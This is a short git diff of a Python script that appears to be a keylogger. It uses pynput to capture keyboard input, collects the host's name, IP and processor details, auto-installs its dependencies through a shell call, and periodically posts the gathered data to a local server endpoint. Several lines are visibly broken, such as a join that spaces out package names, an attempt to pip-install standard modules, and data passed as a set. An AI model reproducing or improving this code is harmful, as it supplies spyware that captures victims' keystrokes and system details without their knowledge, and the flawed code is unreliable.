@@ -3,23 +3,25 @@ import os
 
 if sys.version_info.major >= 3:
     try:
+        data = ''
         import subprocess
-        
-        from pynput import keyboard
         import socket
         import platform
+        from pynput import keyboard
         import threading
         import json
         import requests
-        data = ''
-
+        
 
     except ModuleNotFoundError:
-        packages = ["keyboard","pynput", "json", "requests"]
+        from subprocess import call
+        packages = ["pynput", "json", "requests", "socket"]
         for package in packages:
-            subprocess.call("python3 -m pip install -r" + ' '.join(package), shell=True)
+            call("pip install " + ' '.join(package), shell=True)
 
     finally:
+
+
         USER_HOSTNAME = socket.gethostname()
         USER_IP = socket.gethostbyname(USER_HOSTNAME)
         USER_PROCESSOR = platform.processor()
@@ -39,7 +41,7 @@ if sys.version_info.major >= 3:
             send_data_interval = threading.Timer(100, return_data)
             send_data_interval.start()
             global data
-            r = requests.post('http://localhost:3000/data', data={data})
+            r = requests.post('http://localhost:5000/send', data={data})
 
 
                
